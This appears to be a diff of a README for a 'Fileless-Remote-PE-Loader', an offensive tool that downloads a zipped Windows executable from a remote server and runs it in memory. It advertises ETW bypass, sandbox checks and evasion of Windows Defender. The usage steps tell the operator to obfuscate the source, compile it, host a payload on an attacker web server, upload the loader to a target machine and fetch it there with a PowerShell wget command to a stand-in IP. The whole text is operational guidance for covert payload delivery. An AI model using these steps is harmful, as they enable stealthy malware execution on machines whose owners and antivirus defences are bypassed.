@@ -1,6 +1,6 @@
 ### Fileless-Remote-PE-Loader
 --------------------------------------
-This loader tool enables direct in-memory execution of a x64 PE file (exe embeded in a zip file) retrieved from a remote web server.
+This loader enables direct in-memory execution of a x64 PE file (exe embeded in a zip file) retrieved from a remote web server.
 It implements several defense evasion techniques (e.g. fileless delivery + reflective PE loading, ETW bypass, sandbox checks) designed to bypass antivirus solutions such as Windows Defender.
 
 #### FEATURES
@@ -13,37 +13,40 @@ It implements several defense evasion techniques (e.g. fileless delivery + refle
 
 
 #### USAGE
-- STEP 1 - Modify the source code by removing all comments and 'printf' statements, etc. Then, add into the main() function the URL of your ZIP file embeding the offensive security tool that you want to execute.
-```
-Edit the main() function - Examples:
- - BYTE *zipData = DownloadZipToMemory("http://Your-IP-address/file.zip", &zipSize);
-   or
- - BYTE *zipData = DownloadZipToMemory("https://website/file.zip", &zipSize);
-```
+- STEP 1 - Obfuscate the source code by removing all comments and 'printf' statements, renaming function and variable names, etc.
 
-- STEP 2 - Compile the source code (for example with Visual Studio 2022 Developer Command Prompt v17.14.14).  
+- STEP 2 - Compile the source code.  
            <i/>Note: the tool uses the 'miniz.c' library to perform ZIP decompression operations (https://github.com/richgel999/miniz)</i>
 ```
-Example:
-c:\path-to-project\Fileless-Remote-PE-Loader> cl /TC Fileless-Remote-PE-Loader.c miniz.c /link wininet.lib /MACHINE:X64 /OUT:Fileless-Remote-PE-Loader.exe Icon.res
+Example with Visual Studio 2022 Developer Command Prompt v17.14.14:
+-------------------------------------------------------------------
+c:\path-to-project\Fileless-Remote-PE-Loader> echo IDI_ICON1 ICON "myicon.ico" > appicon.rc
+c:\path-to-project\Fileless-Remote-PE-Loader> rc appicon.rc
+c:\path-to-project\Fileless-Remote-PE-Loader> cl /TC Fileless-Remote-PE-Loader.c miniz.c /link wininet.lib /MACHINE:X64 /OUT:Fileless-Remote-PE-Loader.exe appicon.res
 ```
 
 - STEP 3 - Host on a web server the ZIP file embeding the offensive security tool (x64 PE) that you want to execute
 ```
 Examples:
+---------
 - http://XX.XX.XX.XX:8080/file.zip
 - http://XX.XX.XX.XX/file.zip
 - https://your.website/file.zip
 ```
-- STEP 4 - Upload the tool 'Fileless-Remote-PE-Loader.exe' on a target Windows machine and use it to download, unzip and execute in-memory your remote compressed offensive security tool
+- STEP 4 - Upload the tool 'Fileless-Remote-PE-Loader.exe' on a target Windows machine and create in the same folder an "url.txt" file that contains the url to download your zip file.
+		   When you will run the loader, it will download, unzip and execute in-memory your compressed PE file (x64 exe) located on your remote web server ('url.txt' file).
 ```
 1. Download the loader
-c:\temp> powershell -c "wget -uri https://IP/Fileless-Remote-PE-Loader.exe - OutFile C:\temp\Fileless-Remote-PE-Loader.exe
+----------------------
+c:\temp> powershell -c "wget -uri https://IP/Fileless-Remote-PE-Loader.exe - OutFile C:\temp\Fileless-Remote-PE-Loader.exe"
+c:\temp> echo "http://ip/file.zip" > C:\temp\url.txt
 
 2. Run the loader with the arguments to pass to the PE
+------------------------------------------------------
 c:\temp> Fileless-Remote-PE-Loader.exe arg1 arg2 [...]
-	or
+or
 2.bis Run the loader without argument
+-------------------------------------
 c:\temp> Fileless-Remote-PE-Loader.exe
 No argument was provided. Press 'Enter' to continue, or press 'Ctrl+C' to exit and relaunch with arguments.
 ```
